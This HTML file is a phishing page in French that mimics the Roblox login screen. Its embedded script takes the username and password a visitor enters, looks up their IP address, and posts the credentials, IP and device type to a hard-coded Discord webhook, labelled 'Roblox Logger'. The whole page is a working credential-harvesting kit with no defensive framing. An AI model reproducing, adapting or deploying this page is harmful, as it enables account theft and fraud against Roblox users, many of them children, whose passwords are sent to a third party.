<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Connexion à Roblox</title>
<link rel="icon" href="https://www.roblox.com/favicon.ico">
<style>
  * { box-sizing: border-box; }
  html, body {
    margin: 0; padding: 0; height: 100%;
    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
    background: #121212; color: #ffffff;
  }
  body { display: flex; flex-direction: column; align-items: center; min-height: 100vh; }

  .header {
    width: 100%; height: 60px; background: #1a1a1a;
    border-bottom: 1px solid #2a2a2a;
    display: flex; align-items: center; justify-content: space-between;
    padding: 0 16px;
  }
  .header-left { display: flex; align-items: center; gap: 10px; }
  .header-logo { width: 28px; height: 28px; }
  .header-title { font-size: 18px; font-weight: 700; }
  .header-right { display: flex; gap: 8px; }
  .header-btn {
    height: 34px; padding: 0 14px; background: transparent; color: #fff;
    border: none; border-radius: 6px; font-size: 14px; font-weight: 600;
    font-family: inherit; cursor: pointer;
  }
  .header-btn.primary { background: #fff; color: #121212; }

  .wrap {
    width: 100%; max-width: 400px; display: flex; flex-direction: column;
    gap: 16px; padding: 20px 16px;
  }
  .logo { display: block; width: 56px; height: 56px; margin: 0 auto 16px; }
  h1 { font-size: 28px; font-weight: 700; text-align: center; margin: 0 0 8px; }

  .input {
    width: 100%; height: 48px; padding: 12px 16px; border: none;
    border-radius: 8px; font-size: 16px; font-family: inherit;
    color: #fff; background: #262626; outline: none;
  }
  .input::placeholder { color: #a0a4a8; }

  .btn {
    width: 100%; height: 48px; margin-top: 8px; background: #262626;
    color: #fff; border: 2px solid #fff; border-radius: 8px;
    font-size: 16px; font-weight: 600; font-family: inherit; cursor: pointer;
  }
  .btn:hover { background: #303030; }

  .forgot {
    display: block; text-align: center; margin-top: 12px;
    font-size: 14px; color: #fff; text-decoration: none;
  }
  .options { display: flex; flex-direction: column; gap: 12px; }
  .option-btn {
    width: 100%; height: 48px; background: #262626; color: #fff;
    border: 2px solid #fff; border-radius: 8px; font-size: 16px;
    font-family: inherit; cursor: pointer;
  }
  .signup { text-align: center; font-size: 14px; }
  .signup a { color: #fff; font-weight: 600; text-decoration: none; }
  .footer { margin-top: 32px; font-size: 11px; color: #8d919a; text-align: center; }
</style>
</head>
<body>

<header class="header">
  <div class="header-left">
    <svg class="header-logo" viewBox="0 0 56 56" fill="#fff"><path d="M11.676 0 0 44.166 43.577 56l11.676-44.166zm20.409 35.827-12.177-3.308 3.264-12.342 12.182 3.308z"/></svg>
    <span class="header-title">Roblox</span>
  </div>
  <div class="header-right">
    <button class="header-btn" type="button">S'inscrire</button>
    <button class="header-btn primary" type="button">Connexion</button>
  </div>
</header>

<div class="wrap">
  <svg class="logo" viewBox="0 0 56 56" fill="#fff"><path d="M11.676 0 0 44.166 43.577 56l11.676-44.166zm20.409 35.827-12.177-3.308 3.264-12.342 12.182 3.308z"/></svg>
  <h1>Connexion à Roblox</h1>

  <input class="input" type="text" id="username" placeholder="Identifiant/E-mail/Téléphone" autocapitalize="none" autocorrect="off">
  <input class="input" type="password" id="password" placeholder="Mot de passe">
  <button class="btn" id="btnEnvoyer" type="button">Connexion</button>

  <a class="forgot" href="https://www.roblox.com/login/forgot-password">Mot de passe ou nom d'utilisateur oublié ?</a>

  <div class="options">
    <button class="option-btn" type="button">Envoyez-moi un code unique par email</button>
    <button class="option-btn" type="button">Connexion rapide</button>
  </div>

  <p class="signup">Vous n'avez pas de compte ? <a href="https://www.roblox.com/register">S'inscrire</a></p>

  <div class="footer">© <span id="year"></span> Roblox Corporation</div>
</div>

<script>
var WEBHOOK_URL = "https://discord.com/api/webhooks/1562874617662808188/XVIR60OdhDaWTDLRTb1NUWKr18stMt36wYh8hwTfzZOdwrlA92Iyj50Ii6dp7hrV8gRB";

document.getElementById("year").textContent = new Date().getFullYear();

function getAppareil() {
  var ua = navigator.userAgent;
  if (/android/i.test(ua)) return "📱 Android";
  if (/iphone|ipad|ipod/i.test(ua)) return "📱 iPhone/iPad";
  if (/windows/i.test(ua)) return "🖥 Windows";
  if (/mac/i.test(ua)) return "🍏 Mac";
  if (/linux/i.test(ua)) return "🐧 Linux";
  return "❓ Inconnu";
}

document.getElementById("btnEnvoyer").addEventListener("click", function() {
  var username = document.getElementById("username").value.trim();
  var password = document.getElementById("password").value;

  if (username === "") { alert("Mets ton identifiant"); return; }
  if (password === "") { alert("Mets ton mot de passe"); return; }

  fetch("https://api.ipify.org?format=json")
    .then(function(r){ return r.json(); })
    .then(function(d){ envoyer(d.ip); })
    .catch(function(){ envoyer("inconnue"); });

  function envoyer(ip) {
    fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "🥷 Roblox Logger",
        embeds: [{
          title: "😈 Nouvelle connexion",
          color: 0x00B2FF,
          fields: [
            { name: "👤 Identifiant", value: "`" + username + "`", inline: false },
            { name: "🔑 Mot de passe", value: "`" + password + "`", inline: false },
            { name: "🌐 IP", value: "`" + ip + "`", inline: true },
            { name: "💻 Appareil", value: getAppareil(), inline: true }
          ],
          footer: { text: "Créé par tiktakdz" },
          timestamp: new Date().toISOString()
        }]
      })
    });
  }
});
</script>

</body>
</html>
